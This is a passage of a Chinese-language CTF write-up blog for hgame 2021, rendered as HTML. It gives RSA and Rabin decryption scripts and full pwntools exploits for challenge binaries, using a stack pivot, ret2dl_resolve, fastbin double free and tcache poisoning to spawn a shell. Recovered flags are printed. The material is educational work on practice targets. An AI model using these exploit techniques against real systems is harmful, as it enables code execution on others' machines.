class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">cipher = <span class="number">7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539</span></span><br><span class="line">p = <span class="number">85228565021128901853314934583129083441989045225022541298550570449389839609019</span></span><br><span class="line">q = <span class="number">111614714641364911312915294479850549131835378046002423977989457843071188836271</span></span><br><span class="line">N = q * p</span><br><span class="line"><span class="comment"># 计算yp和yq</span></span><br><span class="line">inv_p = gmpy2.invert(p, q)</span><br><span class="line">inv_q = gmpy2.invert(q, p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算mp和mq</span></span><br><span class="line">mp = pow(cipher, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">mq = pow(cipher, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算a,b,c,d</span></span><br><span class="line">a = (inv_p * p * mq + inv_q * q * mp) % N</span><br><span class="line">b = N - int(a)</span><br><span class="line">c = (inv_p * p * mq - inv_q * q * mp) % N</span><br><span class="line">d = N - int(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (a, b, c, d):</span><br><span class="line">    s = <span class="string">'%x'</span> % i</span><br><span class="line">    <span class="keyword">if</span> len(s) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        s = <span class="string">'0'</span> + s</span><br><span class="line">    <span class="keyword">print</span> s.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>hgame{3xgCd~i5_re4l1y+e@sy^r1ght?}</p>
+<h4 id="WhitegiveRSA"><a href="#WhitegiveRSA" class="headerlink" title="WhitegiveRSA"></a>WhitegiveRSA</h4><p>N可以分解，普通的RSA</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">N = <span class="number">882564595536224140639625987659416029426239230804614613279163</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">747831491353896780365654517748216624798517769637260742155527</span></span><br><span class="line">p = <span class="number">1029224947942998075080348647219</span></span><br><span class="line">q = <span class="number">857504083339712752489993810777</span></span><br><span class="line">phinN = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phinN)</span><br><span class="line">m = gmpy2.powmod(c, d, N)</span><br><span class="line">flag = libnum.n2s(m)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+
+<p>hgame{w0w~yOU_kNoW+R5@!}</p>
+<h3 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h3><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="pwn-2"><a href="#pwn-2" class="headerlink" title="pwn"></a>pwn</h3><h4 id="blackgive"><a href="#blackgive" class="headerlink" title="blackgive"></a>blackgive</h4><p>checksec</p>
+<p>开启了NX</p>
+<p><img src="/image/hgame2021/2-1614044357200.png" alt="2"></p>
+<p>ida</p>
+<p><img src="/image/hgame2021/1-1614044363080.png" alt="1"></p>
+<p>第一个read处有0x10的溢出，可以覆盖到rbp和rip</p>
+<p>进入第二个read可以在bss段，0x6010A0处写0x100字节。</p>
+<p>可以判断是栈迁移。</p>
+<p>栈迁移需要<code>leave，ret</code>指令</p>
+<p>相当于<code>mov  rsp, rbp</code> <code>pop  rbp</code> <code>pop  rip</code></p>
+<p>当我们修改rbp时，rsp会被修改到我们修改的rbp处。</p>
+<p>然后pop rbp会将rsp指向的东西弹出给rbp，并且rsp减一个单位</p>
+<p>然后是pop，rip修改rip寄存器。</p>
+<p>这里我们通过栈迁移，泄露puts的地址，计算libc基址，并getshell</p>
+<p>首先找gadget</p>
+<p><img src="/image/hgame2021/3-1614045221996.png" alt="3"></p>
+<p>然后要通过一个if，并修改rbp和rip</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">leave_ret=<span class="number">0x00000000004007a3</span></span><br><span class="line">payload=<span class="string">'paSsw0rd\0'</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x20</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload+=p64(<span class="number">0x6010a0</span><span class="number">-0x8</span>)+p64(leave_ret) <span class="comment">#rsp要减8</span></span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<p>然后要在bss段布置payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(puts_got)+p64(<span class="number">0</span>)+p64(write_plt)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(bss+<span class="number">12</span>*<span class="number">8</span>)+p64(<span class="number">0</span>)+p64(read_plt)</span><br></pre></td></tr></table></figure>
+
+<p>通过write泄露puts再通过read读取</p>
+<p>接下来写onegadget</p>
+<p>完整exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">p=process(<span class="string">'./blackgive'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./blackgive'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">leave_ret=<span class="number">0x00000000004007a3</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400813</span></span><br><span class="line">pop_rsi=<span class="number">0x0000000000400811</span></span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">'read'</span>]</span><br><span class="line">bss=<span class="number">0x6010A0</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'paSsw0rd\0'</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x20</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload+=p64(bss<span class="number">-8</span>)+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(puts_got)+p64(<span class="number">0</span>)+p64(write_plt)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(bss+<span class="number">12</span>*<span class="number">8</span>)+p64(<span class="number">0</span>)+p64(read_plt)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'right!'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line">libcbase=puts_addr-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libcbase)</span><br><span class="line">one=libcbase+<span class="number">0x4f432</span></span><br><span class="line"></span><br><span class="line">p.send(p64(one))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="without-leak"><a href="#without-leak" class="headerlink" title="without_leak"></a>without_leak</h4><p>checksec</p>
+<p><img src="/image/hgame2021/4-1614047759813.png" alt="4"></p>
+<p>ida</p>
+<p><img src="/image/hgame2021/5-1614047818021.png" alt="5"></p>
+<p>read溢出字节很多，但是只有一个read函数且关闭了输出</p>
+<p>可以判断是<code>ret2dl_resolve</code></p>
+<p>wiki上的教程 <a href="https://ctf-wiki.org/pwn/linux/stackoverflow/advanced-rop/ret2dlresolve/#64" target="_blank" rel="noopener">https://ctf-wiki.org/pwn/linux/stackoverflow/advanced-rop/ret2dlresolve/#64</a></p>
+<p>fmyy师傅的模板 <a href="https://fmyy.pro/2020/04/29/StackOverFlow/Ret2dl-resolve/" target="_blank" rel="noopener">https://fmyy.pro/2020/04/29/StackOverFlow/Ret2dl-resolve/</a></p>
+<p>⼤体思路：栈溢出往 bss 段上读⼊伪造的 link_map，然后执⾏ _dl_runtime_resolve(fake_link_map, 0) , 使其执⾏ system(“exec /bin/sh 1&gt;&amp;0”) 因为 stderr 和 stdout 的⽂件描述符都被关闭了，需要重定向到 0 即 stdin，才能得到输出，所以执⾏的 命令是 exec /bin/sh 1&gt;&amp;0</p>
+<h4 id="Library-management-System"><a href="#Library-management-System" class="headerlink" title="Library management System"></a>Library management System</h4><p>checksec</p>
+<p><img src="/image/hgame2021/1-1614322631404.png" alt="1"></p>
+<p><img src="/image/hgame2021/2-1614322645230.png" alt="2"></p>
+<p>有3个功能</p>
+<p>ida</p>
+<p>add函数</p>
+<p><img src="/image/hgame2021/3-1614322755482.png" alt="3"></p>
+<p>申请的大小最大为112字节，最多15个</p>
+<p><img src="/image/hgame2021/4-1614322939233.png" alt="4"></p>
+<p>在读入tilte的时候会多度一个字节</p>
+<p>删除功能将指针置零。</p>
+<p>先分配四个chunk</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>, <span class="string">'aa\n'</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'aa\n'</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'aa\n'</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'aa\n'</span>) <span class="comment"># 3</span></span><br></pre></td></tr></table></figure>
+
+<p>利⽤ off-by-one 越界改写下⼀个 chunk 的 size 字段，造成 overlap chunk，free 后 chunk1 和 chunk2 合并成⼀个⼤的 0xe0 ⼤小的 chunk</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span> * <span class="number">0x18</span> + <span class="string">'\xe1'</span>) <span class="comment"># 0</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>此时再 malloc(0x68) ，即分配⼀个 0x70 ⼤小的 chunk，从 unsorted bin ⾥分配，可以 leak 地址， 并且 chunk2 在 unsorted bin ⾥</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>, <span class="string">'\n'</span>) <span class="comment"># 1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>再 malloc(0x68) 即可同时有两个指针指向 chunk2 了，可以 double free</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x68</span>, <span class="string">'aa\n'</span>) <span class="comment"># 4, 2 -&gt; chunk2</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'bb\n'</span>) <span class="comment"># 5</span></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+
+<p>之后就是 fastbin attack 改 malloc_hook onegadget ⼀把梭 </p>
+<p>add(0x68, ‘\n’) # 1 show(1) add(0x68, ‘aa\n’) # 4, 2 -&gt; chunk2 add(0x68, ‘bb\n’) # 5 dele(2) dele(5) dele(4) 但是 onegadget 条件都不满⾜，需要利⽤ realloc，来调整 rsp，⼤概思路就是 __realloc_hook 改为 onegadget， __realloc_hook 紧接着后⾯就是 __malloc_hook ，覆盖为 realloc 函数开头的某处偏 移</p>
+<p>通过这些 push 来调整 rsp，而 realloc 会调⽤ __realloc_hook ，这样就可以调整 rsp 后，紧接着跳<br>转到 onegadget 进⾏ getshe</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p=process(<span class="string">'./library'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, context)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice: '</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'title: '</span>, str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Input the book's title: "</span>)</span><br><span class="line">    p.send(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice: '</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'id: '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice: '</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'id: '</span>, str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\xe1'</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\n'</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">lbase=u64(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>))- <span class="number">0x7ffff7dd1c48</span> + <span class="number">0x7ffff7a0d000</span></span><br><span class="line">__malloc_hook = lbase + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc = lbase + libc.sym[<span class="string">'realloc'</span>]</span><br><span class="line">one = lbase + <span class="number">0x4527a</span></span><br><span class="line"><span class="comment"># double free</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'aa\n'</span>) <span class="comment"># 4 2</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'bb\n'</span>) <span class="comment"># 5</span></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># __malloc_hook -&gt; one_gadget</span></span><br><span class="line">add(<span class="number">0x68</span>, p64(__malloc_hook<span class="number">-0x23</span>) + <span class="string">'\n'</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'aa\n'</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'aa\n'</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'a'</span> * <span class="number">0xb</span> + p64(one) + p64(realloc+<span class="number">13</span>) + <span class="string">'\n'</span>) <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'title: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="todolist2"><a href="#todolist2" class="headerlink" title="todolist2"></a>todolist2</h4><p><img src="/image/hgame2021/1-1614064752803.png" alt="1"></p>
+<p>功能</p>
+<p><img src="/image/hgame2021/2-1614064767644.png" alt="2"></p>
+<p>delete中将free的堆块指针置零了。不能利用UAF了。</p>
+<p>take plan中</p>
+<p><img src="/image/hgame2021/3-1614064848863.png" alt="3"></p>
+<p>可以申请0到4095字节的9个堆块。</p>
+<p>edit处有负数溢出，造成写任意长度。</p>
+<p><img src="/image/hgame2021/4-1614065200144.png" alt="4"></p>
+<p>这里利用堆溢出</p>
+<p>首先创建4个chunk</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">take(<span class="number">0x40</span>) <span class="comment">#0</span></span><br><span class="line">take(<span class="number">0x40</span>) <span class="comment">#1</span></span><br><span class="line">take(<span class="number">0x500</span>) <span class="comment">#2</span></span><br><span class="line">take(<span class="number">0x40</span>) <span class="comment">#3</span></span><br></pre></td></tr></table></figure>
+
+<p>利用0号chunk的溢出修改1号chunk的标志位，使1号和2号两个chunk合并</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x561</span>))</span><br></pre></td></tr></table></figure>
+
+<p>修改前</p>
+<p><img src="/image/hgame2021/5-1614066292554.png" alt="5"></p>
+<p>修改后</p>
+<p><img src="/image/hgame2021/6-1614066431150.png" alt="6"></p>
+<p>这时，我们释放1号chunk</p>
+<p><img src="/image/hgame2021/7-1614067129891.png" alt="7"></p>
+<p>因为大小超过tcache的最大chunk大小，放置再unsorted bin中，第一个unsorted bin的fd，bk指向main_arena+96的地方</p>
+<p>查看libc可以知道main_arena和malloc_hook的偏移，获得libc基址。</p>
+<p>我们这时再申请一个0x40的堆块，unsorted bin中被释放的堆块被切割分配</p>
+<p><img src="/image/hgame2021/8-1614067979489.png" alt="8"></p>
+<p>通过show泄露并计算libc基址和free_hook</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">take(<span class="number">0x40</span>) <span class="comment">#4</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(leak_addr)</span><br><span class="line">libcbase=leak_addr-libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x10</span><span class="number">-96</span></span><br><span class="line"><span class="keyword">print</span> hex(libcbase)</span><br><span class="line">free_hook = libcbase + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">one = libcbase + <span class="number">0x4f432</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来释放4号chunk，它的位置实际上是1号chunk的位置，0x40大小，会被放入tcache中</p>
+<p>再次通过0号chunk的溢出修改4号chunk的fd指针指向free_hook</p>
+<p>然后再次申请2个0x40大小的chunk，将free_hook所在的位置申请为6号chunk</p>
+<p>然后再修改free_hook为onegadget</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">51</span>)+p64(free_hook))</span><br><span class="line">take(<span class="number">0x40</span>) <span class="comment">#5</span></span><br><span class="line">take(<span class="number">0x40</span>) <span class="comment">#6</span></span><br><span class="line">edit(<span class="number">6</span>,p64(one))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/hgame2021/9-1614069470717.png" alt="9"></p>
+<p>可以看到free_hook已经被改了</p>
+<p>再接下来释放一个chunk就可以触发onegadget</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">libc=ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">p=process(<span class="string">'./todolist2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">take</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'exit'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'write?'</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'exit'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'delete?'</span>,str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'exit'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'edit?'</span>,str(num))</span><br><span class="line">    p.sendlineafter(<span class="string">'write?'</span>,str(<span class="number">-1</span>))</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'exit'</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'check?'</span>,str(num))</span><br><span class="line"></span><br><span class="line">take(<span class="number">0x40</span>)</span><br><span class="line">take(<span class="number">0x40</span>)</span><br><span class="line">take(<span class="number">0x500</span>)</span><br><span class="line">take(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x561</span>))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">take(<span class="number">0x40</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(leak_addr)</span><br><span class="line">libcbase=leak_addr-libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x10</span><span class="number">-96</span></span><br><span class="line"><span class="keyword">print</span> hex(libcbase)</span><br><span class="line">free_hook = libcbase + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">one = libcbase + <span class="number">0x4f432</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">51</span>)+p64(free_hook))</span><br><span class="line">take(<span class="number">0x40</span>)</span><br><span class="line">take(<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(one))</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="crypto-2"><a href="#crypto-2" class="headerlink" title="crypto"></a>crypto</h3><h4 id="LikiPrime"><a href="#LikiPrime" class="headerlink" title="LikiPrime"></a>LikiPrime</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> secrets, flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span><span class="params">(secret)</span>:</span></span><br><span class="line">    prime = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(secret):</span><br><span class="line">        prime = prime &lt;&lt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> prime - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">random.shuffle(secrets)</span><br><span 